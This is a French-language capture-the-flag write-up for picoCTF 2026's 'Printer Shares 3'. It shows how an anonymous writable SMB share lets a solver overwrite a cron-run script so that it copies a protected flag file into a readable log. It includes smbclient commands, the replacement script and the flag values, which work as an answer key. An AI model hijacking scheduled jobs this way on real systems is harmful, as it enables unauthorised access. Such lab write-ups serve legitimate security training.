# 741 — Printer Shares 3

**Événement** : picoCTF 2026 · **Catégorie** : General Skills

> Synthèse rédigée à partir des sources publiques listées en fin de fiche : ce challenge a été
> résolu côté CyLab Academy, mais le writeup d'origine n'a pas été conservé.

## Énoncé
« I accidentally left the debug script in place... Well, I think that's fine - No one could possibly
access my super secure directory. » Troisième volet de la série *Printer Shares* (voir aussi
*Printer Shares 2*).

## Analyse
Le serveur expose un partage SMB `shares` en session nulle (anonyme) et un `secure-shares` protégé.
Le partage public contient deux fichiers : `script.sh` et `cron.log`. Les horodatages de `cron.log`
sont espacés d'une minute et le script contient `# this script runs every minute` : un cron exécute
donc le script **depuis le partage accessible en écriture**.

C'est la faille : le partage est anonyme **et inscriptible**, donc on remplace `script.sh` par une
charge utile qui lit le flag dans le répertoire protégé (auquel le cron a accès) et l'ajoute à
`cron.log`, lui-même lisible sur le partage. Il suffit d'attendre environ une minute puis de
télécharger le log mis à jour.

## Solution
```bash
smbclient -L //<HOST> -p <PORT> -N
smbclient //<HOST>/shares -p <PORT> -N
#   ls ; get script.sh ; get cron.log ; exit
cat script.sh ; cat cron.log

cat > script.sh << 'EOF'
#!/bin/bash
echo "Health Check: $(date)"
cat /challenge/secure-shares/flag.txt >> /challenge/shares/cron.log 2>&1
EOF

smbclient //<HOST>/shares -p <PORT> -N -c 'put script.sh'
# attendre ~60-70 s
smbclient //<HOST>/shares -p <PORT> -N -c 'get cron.log'
cat cron.log
```
Boucle d'attente possible :
`until grep -q 'picoCTF' cron.log; do smbclient //<HOST>/shares -p PORT -N -c 'get cron.log'; sleep 10; done`.
Une variante de reconnaissance consiste à remplacer le script par un `find / -name "*flag*"` :
`cron.log` révèle alors `/challenge/secure-shares/flag.txt`.

## Flag
```
picoCTF{5mb_pr1nter_5h4re5_r3v3r53_0eb29140}
```
Le suffixe dépend de l'instance : deux autres writeups publics donnent
`..._r3v3r53_85690588` et `..._r3v3r53_b68ad4a8`.

## Sources
- https://picoctfsolutions.com/picoctf-2026-printer-shares-3 — page de solution picoCTF 2026 (partage inscriptible, cron toutes les minutes, `put` du script)
- https://qiita.com/8omp/items/8e1aa38aeda96fa0ecb6 — writeup picoCTF 2026 General Skills (script de reconnaissance, flag complet)
- https://cyb3r-bo1.github.io/posts/picoCTF_2026_writeup/ — writeup picoCTF 2026 (variante du flag)
- https://shukularuni.neocities.org/guide/ctf/picoctf/general/Printer_Shares_3.html — guide picoCTF/CyLab Academy (variante du flag)
